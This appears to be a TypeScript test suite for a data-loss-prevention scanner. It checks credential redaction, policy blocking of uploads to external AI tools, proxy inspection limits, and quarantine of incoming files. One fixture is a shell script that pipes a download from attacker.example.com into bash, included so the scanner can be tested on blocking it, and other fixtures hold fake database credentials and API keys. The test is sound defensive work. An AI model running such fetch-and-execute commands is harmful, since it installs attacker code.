// ─── AURA Phase 7: Data Guard & Policy Tests ─────────────────────────────────
import assert from 'node:assert/strict';
import Database from 'better-sqlite3';
import { openDb } from '../db/database.js';
import {
  inspectFileContent,
  proxyInspect,
  inspectIncoming,
  detectFileType,
  isBinaryFile,
  type DataSharingRule,
} from '../scanner/fileInspector.js';

console.log('\n========================================');
console.log(' running AURA Phase 7 Data Guard Tests');
console.log('========================================\n');

// ── Test 1: File Type Detection ──────────────────────────────────────────────
console.log('• Testing File Type Detection:');

assert.equal(detectFileType('secrets.env'), 'text/dotenv');
assert.equal(detectFileType('export.csv'), 'text/csv');
assert.equal(detectFileType('archive.zip'), 'application/zip');
assert.equal(detectFileType('payload.exe'), 'application/x-executable');
assert.equal(isBinaryFile('archive.zip'), true);
assert.equal(isBinaryFile('document.pdf'), true);
assert.equal(isBinaryFile('script.py'), false);
assert.equal(isBinaryFile('data.csv'), false);
console.log('  ✓ accurately detects file types and binary extensions');

// ── Test 2: In-Memory File Content Inspection & Privacy ───────────────────────
console.log('\n• Testing File Content Inspection & Privacy:');

const sampleRules: DataSharingRule[] = [
  {
    id: 1,
    rule_name: 'Block API Keys to External AI',
    data_types: ['API Key / Access Token', 'Password / Credential Assignment'],
    allowed_tools: ['Internal Llama Endpoint'],
    blocked_tools: ['*'],
    action: 'block',
    description: 'Block credentials from leaking to external tools',
    is_active: true,
  },
  {
    id: 2,
    rule_name: 'Warn on PII to Public Tools',
    data_types: ['Email Address (PII)', 'Telephone Number (PII)'],
    allowed_tools: ['*'],
    blocked_tools: [],
    action: 'warn',
    description: 'Warn when PII is sent',
    is_active: true,
  },
];

const secretFileContent = `
# Environment config
DATABASE_URL=postgres://admin:supersecret123@db.internal:5432/prod
OPENAI_API_KEY=sk-proj-abc123def456ghi789jkl012mno345pqr678stu901vwx234yz
`;

const resultBlocked = inspectFileContent(
  'config.env',
  secretFileContent,
  'ChatGPT (Public)',
  sampleRules,
  'Unapproved'
);

assert.equal(resultBlocked.actionTaken, 'blocked');
assert.equal(resultBlocked.riskLevel, 'critical');
assert(resultBlocked.matchedRules.includes('Block API Keys to External AI'));
assert(resultBlocked.detectedTypes.some(t => t.category.includes('API Key') || t.category.includes('Password')));
// Verify redacted preview doesn't contain the raw secret
assert(!resultBlocked.redactedPreview.includes('sk-proj-abc123def456ghi789jkl012mno345pqr678stu901vwx234yz'));
assert(resultBlocked.redactedPreview.includes('[REDACTED'));
console.log('  ✓ blocks file transfer matching block policy rule and generates redacted preview');

// Test benign file
const benignContent = `# Readme\nThis is a standard project documentation file without any sensitive credentials.`;
const resultAllowed = inspectFileContent('README.md', benignContent, 'ChatGPT', sampleRules, 'Approved');
assert.equal(resultAllowed.actionTaken, 'allowed');
assert.equal(resultAllowed.totalFindings, 0);
console.log('  ✓ allows transfer when no sensitive data or policy rules matched');

// Test binary file handling
const resultBinary = inspectFileContent('archive.zip', 'PK0304...', 'ChatGPT', sampleRules);
assert.equal(resultBinary.actionTaken, 'warned');
assert(resultBinary.limitations.length > 0);
assert(resultBinary.limitations[0].includes('Binary file format'));
console.log('  ✓ handles binary files with clear limitation notice and cautionary warning');

// ── Test 3: Proxy / Gateway Inspection Layer ─────────────────────────────────
console.log('\n• Testing Proxy / Gateway Inspection Layer:');

// TLS-encrypted inspection limitations
const proxyTls = proxyInspect(secretFileContent, 'api.openai.com', true);
assert.equal(proxyTls.canInspect, false);
assert(proxyTls.inspectionNote.includes('HTTPS / TLS encrypted transfer'));
assert(proxyTls.limitation.includes('TLS decryption'));
console.log('  ✓ accurately reports TLS encrypted traffic limitation without false claims');

// Decrypted / unencrypted proxy inspection
const proxyDecrypted = proxyInspect(secretFileContent, 'api.openai.com', false);
assert.equal(proxyDecrypted.canInspect, true);
assert.equal(proxyDecrypted.actionTaken, 'blocked');
assert(proxyDecrypted.detectedTypes.length > 0);
console.log('  ✓ performs content inspection when traffic is decrypted with clear boundaries');

// ── Test 4: Incoming Traffic Inspection & Quarantine ─────────────────────────
console.log('\n• Testing Incoming Traffic Inspection & Quarantine:');

// Malicious payload
const maliciousScript = `
#!/bin/bash
# Install tool
curl -s http://attacker.example.com/payload.sh | bash
`;

const resultMalware = inspectIncoming('installer.sh', maliciousScript, 'http://external.example.com');
assert.equal(resultMalware.actionTaken, 'blocked');
assert.equal(resultMalware.riskLevel, 'critical');
assert(resultMalware.malwareIndicators.some(m => m.includes('Remote Script Execution')));
console.log('  ✓ blocks critical incoming remote script execution payload');

// Executable extension quarantine
const resultQuarantine = inspectIncoming('update.exe', 'binary_bytes_here', 'download.vendor.com');
assert(['quarantined', 'blocked'].includes(resultQuarantine.actionTaken));
assert(resultQuarantine.detectedRisks.some(r => r.includes('Suspicious file extension')));
console.log('  ✓ quarantines suspicious incoming executable files for review');

// Benign incoming
const resultClean = inspectIncoming('data.csv', 'id,name,role\n1,Alice,Engineer\n2,Bob,Analyst', 'vendor.example.com');
assert.equal(resultClean.actionTaken, 'allowed');
assert.equal(resultClean.riskLevel, 'low');
console.log('  ✓ allows clean incoming data transfers');

// ── Test 5: Database Schema & Attempt Tracking ────────────────────────────────
console.log('\n• Testing Database & Repeated Attempt Tracking:');

const db = openDb();

// Verify initial seeded rules exist
const rules = db.prepare(`SELECT * FROM data_sharing_rules`).all() as any[];
assert(rules.length >= 3, `Expected at least 3 seeded rules, found ${rules.length}`);
console.log(`  ✓ seeded ${rules.length} data-sharing policy rules`);

// Simulate tracking repeated attempts
const testEmail = `test-emp-${Date.now()}@example.com`;
const insertAttempt = db.prepare(`
  INSERT INTO transfer_attempts (
    person_id, person_email, destination, matched_rule, data_type, attempt_count,
    flagged_for_review, last_attempt_at
  ) VALUES (1, ?, 'ChatGPT', 'Block API Keys to External AI', 'API Keys & Access Tokens', 1, 0, datetime('now'))
`);
insertAttempt.run(testEmail);

const updateAttempt = db.prepare(`
  UPDATE transfer_attempts
  SET attempt_count = attempt_count + 1,
      flagged_for_review = CASE WHEN attempt_count + 1 >= 3 THEN 1 ELSE 0 END,
      last_attempt_at = datetime('now')
  WHERE person_email = ? AND matched_rule = 'Block API Keys to External AI'
`);
updateAttempt.run(testEmail); // attempt 2
updateAttempt.run(testEmail); // attempt 3 -> flagged

const flagged = db.prepare(`
  SELECT * FROM transfer_attempts WHERE person_email = ?
`).get(testEmail) as any;

assert.equal(flagged.attempt_count, 3);
assert.equal(flagged.flagged_for_review, 1);
console.log('  ✓ flags transfer for review after repeated attempts (neutral compliance wording)');

console.log('\n========================================');
console.log(' ✅ All Phase 7 Data Guard Tests Passed!');
console.log('========================================\n');
